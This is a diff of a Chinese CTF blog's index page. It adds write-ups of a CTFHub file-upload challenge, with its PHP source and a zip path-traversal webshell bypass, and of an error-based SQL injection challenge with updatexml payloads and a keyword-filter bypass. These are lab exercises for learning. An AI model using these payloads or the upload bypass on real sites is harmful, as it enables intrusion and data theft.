@@ -147,7 +147,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E5%B0%8F%E8%AE%A1-1/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/14/CTFHUB-web%E8%BF%9B%E9%98%B6-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -161,7 +161,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2022/03/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E5%B0%8F%E8%AE%A1-1/" class="post-title-link" itemprop="url">网络安全知识小计-1</a>
+            <a href="/2022/03/14/CTFHUB-web%E8%BF%9B%E9%98%B6-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="post-title-link" itemprop="url">CTFHUB 【第二章web进阶-Web文件上传漏洞】</a>
         </h2>
 
         <div class="post-meta">
@@ -170,10 +170,184 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
-              
 
-              <time title="Created: 2022-03-16 14:22:14 / Modified: 14:04:52" itemprop="dateCreated datePublished" datetime="2022-03-16T14:22:14+08:00">2022-03-16</time>
+              <time title="Created: 2022-03-14 16:43:14" itemprop="dateCreated datePublished" datetime="2022-03-14T16:43:14+08:00">2022-03-14</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2022-03-16 17:13:44" itemprop="dateModified" datetime="2022-03-16T17:13:44+08:00">2022-03-16</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="先上题目源码"><a href="#先上题目源码" class="headerlink" title="先上题目源码"></a>先上题目源码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-Type:text/html; charset=utf-8&quot;);</span><br><span class="line">// 每5分钟会清除一次目录下上传的文件</span><br><span class="line">require_once(&#x27;pclzip.lib.php&#x27;);</span><br><span class="line"></span><br><span class="line">if(!$_FILES)&#123;</span><br><span class="line"></span><br><span class="line">        echo &#x27;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;zh&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot; /&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot; /&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot; /&gt;</span><br><span class="line">    &lt;title&gt;文件上传章节练习题&lt;/title&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@3.3.7/dist/css/bootstrap.min.css&quot; integrity=&quot;sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u&quot; crossorigin=&quot;anonymous&quot;&gt;</span><br><span class="line">    &lt;style type=&quot;text/css&quot;&gt;</span><br><span class="line">        .login-box&#123;</span><br><span class="line">            margin-top: 100px;</span><br><span class="line">            height: 500px;</span><br><span class="line">            border: 1px solid #000;</span><br><span class="line">        &#125;</span><br><span class="line">        body&#123;</span><br><span class="line">            background: white;</span><br><span class="line">        &#125;</span><br><span class="line">        .btn1&#123;</span><br><span class="line">            width: 200px;</span><br><span class="line">        &#125;</span><br><span class="line">        .d1&#123;</span><br><span class="line">            display: block;</span><br><span class="line">            height: 400px;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div class=&quot;container&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;login-box col-md-12&quot;&gt;</span><br><span class="line">        &lt;form class=&quot;form-horizontal&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; &gt;</span><br><span class="line">            &lt;h1&gt;文件上传章节练习题&lt;/h1&gt;</span><br><span class="line">            &lt;hr /&gt;</span><br><span class="line">            &lt;div class=&quot;form-group&quot;&gt;</span><br><span class="line">                &lt;label class=&quot;col-sm-2 control-label&quot;&gt;选择文件：&lt;/label&gt;</span><br><span class="line">                &lt;div class=&quot;input-group col-sm-10&quot;&gt;</span><br><span class="line">                    &lt;div &gt;</span><br><span class="line">                    &lt;label for=&quot;&quot;&gt;</span><br><span class="line">                        &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">                    &lt;/label&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">                </span><br><span class="line">        &lt;div class=&quot;col-sm-8  text-right&quot;&gt;</span><br><span class="line">            &lt;input type=&quot;submit&quot; class=&quot;btn btn-success text-right btn1&quot; /&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&#x27;;</span><br><span class="line"></span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    $file = $_FILES[&#x27;file&#x27;];</span><br><span class="line"></span><br><span class="line">    if(!$file)&#123;</span><br><span class="line">        exit(&quot;请勿上传空文件&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $name = $file[&#x27;name&#x27;];</span><br><span class="line"></span><br><span class="line">    $dir = &#x27;upload/&#x27;;</span><br><span class="line">    $ext = strtolower(substr(strrchr($name, &#x27;.&#x27;), 1));</span><br><span class="line">    $path = $dir.$name;</span><br><span class="line"></span><br><span class="line">    function check_dir($dir)&#123;</span><br><span class="line">        $handle = opendir($dir);</span><br><span class="line">        while(($f = readdir($handle)) !== false)&#123;</span><br><span class="line">            if(!in_array($f, array(&#x27;.&#x27;, &#x27;..&#x27;)))&#123;</span><br><span class="line">                if(is_dir($dir.$f))&#123;</span><br><span class="line">                    check_dir($dir.$f.&#x27;/&#x27;);</span><br><span class="line">                 &#125;else&#123;</span><br><span class="line">                    $ext = strtolower(substr(strrchr($f, &#x27;.&#x27;), 1));</span><br><span class="line">                    if(!in_array($ext, array(&#x27;jpg&#x27;, &#x27;gif&#x27;, &#x27;png&#x27;)))&#123;</span><br><span class="line">                        unlink($dir.$f);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(!is_dir($dir))&#123;</span><br><span class="line">        mkdir($dir);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $temp_dir = $dir.md5(time(). rand(1000,9999));</span><br><span class="line">    if(!is_dir($temp_dir))&#123;</span><br><span class="line">        mkdir($temp_dir);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(in_array($ext, array(&#x27;zip&#x27;, &#x27;jpg&#x27;, &#x27;gif&#x27;, &#x27;png&#x27;)))&#123;</span><br><span class="line">        if($ext == &#x27;zip&#x27;)&#123;</span><br><span class="line">            $archive = new PclZip($file[&#x27;tmp_name&#x27;]);</span><br><span class="line">            foreach($archive-&gt;listContent() as $value)&#123;</span><br><span class="line">                $filename = $value[&quot;filename&quot;];</span><br><span class="line">                if(preg_match(&#x27;/\.php$/&#x27;, $filename))&#123;</span><br><span class="line">                     exit(&quot;压缩包内不允许含有php文件!&quot;);</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            if ($archive-&gt;extract(PCLZIP_OPT_PATH, $temp_dir, PCLZIP_OPT_REPLACE_NEWER) == 0) &#123;</span><br><span class="line">                   exit(&quot;解压失败&quot;);</span><br><span class="line">                   check_dir($dir);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            check_dir($dir);</span><br><span class="line">            exit(&#x27;上传成功!&#x27;);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            move_uploaded_file($file[&#x27;tmp_name&#x27;], $temp_dir.&#x27;/&#x27;.$file[&#x27;name&#x27;]);</span><br><span class="line">            check_dir($dir);</span><br><span class="line">            exit(&#x27;上传成功!&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        exit(&#x27;仅允许上传zip、jpg、gif、png文件!&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>得知上传限制：</p>
+<p>1.仅允许上传zip、jpg、gif、png文件!</p>
+<p>2.如果上传压缩包，压缩包内不允许含有php文件</p>
+<h3 id="信息收集和代码分析"><a href="#信息收集和代码分析" class="headerlink" title="信息收集和代码分析"></a>信息收集和代码分析</h3><h5 id="限制1"><a href="#限制1" class="headerlink" title="限制1"></a>限制1</h5><p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/001.png" alt="001"></p>
+<p>apache存在的多后缀文件解析漏洞，这里上传一个任何不可识别的后缀都行（如：x.php.xxx），都可绕过该正则限制</p>
+<h5 id="限制2"><a href="#限制2" class="headerlink" title="限制2"></a>限制2</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$archive</span>-&gt;<span class="title function_ invoke__">extract</span>(PCLZIP_OPT_PATH, <span class="variable">$temp_dir</span>, PCLZIP_OPT_REPLACE_NEWER) == <span class="number">0</span>) &#123;</span><br><span class="line">                   <span class="keyword">exit</span>(<span class="string">&quot;解压失败&quot;</span>);</span><br><span class="line">                   <span class="title function_ invoke__">check_dir</span>(<span class="variable">$dir</span>);</span><br></pre></td></tr></table></figure>
+
+<p>接合上面未截出的代码得知，<code>check_dir</code>作用于<code>upload</code>文件夹以下，将解压出的文件穿越到<code>非upload</code>目录，<code>check__dir</code>将无法删除文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$temp_dir</span> = <span class="variable">$dir</span>.<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">time</span>(). <span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>));</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$temp_dir</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$temp_dir</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>zip</code>压缩包被解压到<code>/upload/随机md5/</code>目录下，由此可得知手动几乎不可能找到随机的文件夹，需要穿越两个目录</p>
+<h3 id="构造压缩包"><a href="#构造压缩包" class="headerlink" title="构造压缩包"></a>构造压缩包</h3><p>再此之前试过其他绕过方法后行不通，开始尝试使用压缩包来绕过</p>
+<p>将之前的PHP马改成<code>123123123.php.XXX</code>,文件名留够<code>/../../</code>的位置,以便穿越，后缀随便，我<code>jpg</code>是因为之前测试用的，就不改了</p>
+<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/002.png" alt="002"></p>
+<p>压缩后得左边的压缩包，并把压缩包放入<code>010EditorPortable.exe</code>，修改压缩包内的文件名</p>
+<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/003.png" alt="003"></p>
+<p>上传测试，右边返回的是（上传成功！）</p>
+<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/004.png" alt="004"></p>
+<p>到<code>url</code>下获得<code>flag</code>，看见<code>zip</code>解压出来的文件，即绕过成功</p>
+<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/005.png" alt="005"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/02/CTFHUB-SQL%E6%B3%A8%E5%85%A5-2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="UknowJJ">
+      <meta itemprop="description" content="人们不会总是很快理解自己当前某件事的价值，直到它变成回忆。🍂">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="JJhome">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/03/02/CTFHUB-SQL%E6%B3%A8%E5%85%A5-2/" class="post-title-link" itemprop="url">CTFHUB-SQL注入-2</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2022-03-02 00:35:30" itemprop="dateCreated datePublished" datetime="2022-03-02T00:35:30+08:00">2022-03-02</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2022-03-16 17:09:29" itemprop="dateModified" datetime="2022-03-16T17:09:29+08:00">2022-03-16</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="CTFHUB-SQL注入-2思维小计"><a href="#CTFHUB-SQL注入-2思维小计" class="headerlink" title="CTFHUB-SQL注入-2思维小计"></a>CTFHUB-SQL注入-2思维小计</h1><h3 id="函数解析"><a href="#函数解析" class="headerlink" title="函数解析"></a>函数解析</h3><p><code>updatexml()</code> 通过这个函数 可以让mysql产生报错信息 但是 还是会执行这个查询语句 查询的结果会跟报错信息一起返回</p>
+<p><code>0x7e</code> 是~的十六进制，用于显示完整信息，避免被吃</p>
+<h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><p>1.F12查看页面注释，有提示，在url中加入<code>?tips=1</code>出现报错信息</p>
+<p>2.burp抓包尝试在<code>name</code>后加上<code>&#39;</code>,会出现报错</p>
+<p>![1](E:...          This is Uknow—JJ\A一些小记录\notes\博客图片\1.png)</p>
+<p>3.order by 4会报错，确定只有三列，这是一个报错注入</p>
+<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/2.png" alt="2"></p>
+<p>4.用updatexml函数进行报错返回值<img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/3.png" alt="3"></p>
+<p>构建语句发现只返回了一个~</p>
+<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/4.png" alt="4"></p>
+<p>发现中间这个值才会被返回<br><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/5.png" alt="5"></p>
+<p>于是构造函数 <code>123&#39; and updatexml(1,concat(0x7e,(select 1)),1)#</code></p>
+<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/6.png" alt="6"></p>
+<p>查出库名为note <code>123’ and updatexml(1,concat(0x7e,(select database())),3)#</code></p>
+<p>构造语句</p>
+<p><code>name=123&#39;and updatexml(1,concat(0x7e,(selselectect(group_concat(table_name))from information_schema.tables where table_schema=’note‘)),1)#&amp;pass=xxxx</code></p>
+<p>原因：<code>select</code>被过滤双关键字绕过 selselectect</p>
+<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p><code>name=123&#39;and updatexml(1,concat(0x7e,(selselectect(flag)from fl4g)),1)#&amp;pass=xxxx</code></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E5%B0%8F%E8%AE%A1-1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="UknowJJ">
+      <meta itemprop="description" content="人们不会总是很快理解自己当前某件事的价值，直到它变成回忆。🍂">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="JJhome">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/01/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E5%B0%8F%E8%AE%A1-1/" class="post-title-link" itemprop="url">网络安全知识小计-1</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2022-01-16 14:22:14" itemprop="dateCreated datePublished" datetime="2022-01-16T14:22:14+08:00">2022-01-16</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2022-03-16 17:09:49" itemprop="dateModified" datetime="2022-03-16T17:09:49+08:00">2022-03-16</time>
+              </span>
 
           
 
@@ -228,7 +402,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/12/CTFHUB-SQL%E6%B3%A8%E5%85%A5-2/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/19/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E6%9F%90payload%E6%8B%86%E8%A7%A3%E5%88%86%E6%9E%90/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -242,7 +416,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2022/03/12/CTFHUB-SQL%E6%B3%A8%E5%85%A5-2/" class="post-title-link" itemprop="url">CTFHUB-SQL注入-2</a>
+            <a href="/2021/11/19/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E6%9F%90payload%E6%8B%86%E8%A7%A3%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">布尔盲注某payload拆解分析</a>
         </h2>
 
         <div class="post-meta">
@@ -252,96 +426,14 @@
               </span>
               <span class="post-meta-item-text">Posted on</span>
 
-              <time title="Created: 2022-03-12 00:35:30" itemprop="dateCreated datePublished" datetime="2022-03-12T00:35:30+08:00">2022-03-12</time>
+              <time title="Created: 2021-11-19 15:05:00" itemprop="dateCreated datePublished" datetime="2021-11-19T15:05:00+08:00">2021-11-19</time>
             </span>
               <span class="post-meta-item">
                 <span class="post-meta-item-icon">
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2022-03-16 13:59:23" itemprop="dateModified" datetime="2022-03-16T13:59:23+08:00">2022-03-16</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="CTFHUB-SQL注入-2思维小计"><a href="#CTFHUB-SQL注入-2思维小计" class="headerlink" title="CTFHUB-SQL注入-2思维小计"></a>CTFHUB-SQL注入-2思维小计</h1><h3 id="函数解析"><a href="#函数解析" class="headerlink" title="函数解析"></a>函数解析</h3><p><code>updatexml()</code> 通过这个函数 可以让mysql产生报错信息 但是 还是会执行这个查询语句 查询的结果会跟报错信息一起返回</p>
-<p><code>0x7e</code> 是~的十六进制，用于显示完整信息，避免被吃</p>
-<h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><p>1.F12查看页面注释，有提示，在url中加入<code>?tips=1</code>出现报错信息</p>
-<p>2.burp抓包尝试在<code>name</code>后加上<code>&#39;</code>,会出现报错</p>
-<p>![1](E:...          This is Uknow—JJ\A一些小记录\notes\博客图片\1.png)</p>
-<p>3.order by 4会报错，确定只有三列，这是一个报错注入</p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/2.png" alt="2"></p>
-<p>4.用updatexml函数进行报错返回值<img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/3.png" alt="3"></p>
-<p>构建语句发现只返回了一个~</p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/4.png" alt="4"></p>
-<p>发现中间这个值才会被返回<br><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/5.png" alt="5"></p>
-<p>于是构造函数 <code>123&#39; and updatexml(1,concat(0x7e,(select 1)),1)#</code></p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/6.png" alt="6"></p>
-<p>查出库名为note <code>123’ and updatexml(1,concat(0x7e,(select database())),3)#</code></p>
-<p>构造语句</p>
-<p><code>name=123&#39;and updatexml(1,concat(0x7e,(selselectect(group_concat(table_name))from information_schema.tables where table_schema=’note‘)),1)#&amp;pass=xxxx</code></p>
-<p>原因：<code>select</code>被过滤双关键字绕过 selselectect</p>
-<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p><code>name=123&#39;and updatexml(1,concat(0x7e,(selselectect(flag)from fl4g)),1)#&amp;pass=xxxx</code></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/10/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E6%9F%90payload%E6%8B%86%E8%A7%A3%E5%88%86%E6%9E%90/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="UknowJJ">
-      <meta itemprop="description" content="人们不会总是很快理解自己当前某件事的价值，直到它变成回忆。🍂">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="JJhome">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/03/10/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E6%9F%90payload%E6%8B%86%E8%A7%A3%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">布尔盲注某payload拆解分析</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2022-03-10 15:05:00" itemprop="dateCreated datePublished" datetime="2022-03-10T15:05:00+08:00">2022-03-10</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2022-03-16 13:59:41" itemprop="dateModified" datetime="2022-03-16T13:59:41+08:00">2022-03-16</time>
+                <time title="Modified: 2022-03-16 17:10:03" itemprop="dateModified" datetime="2022-03-16T17:10:03+08:00">2022-03-16</time>
               </span>
 
           
@@ -457,7 +549,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">3</span>
+          <span class="site-state-item-count">4</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
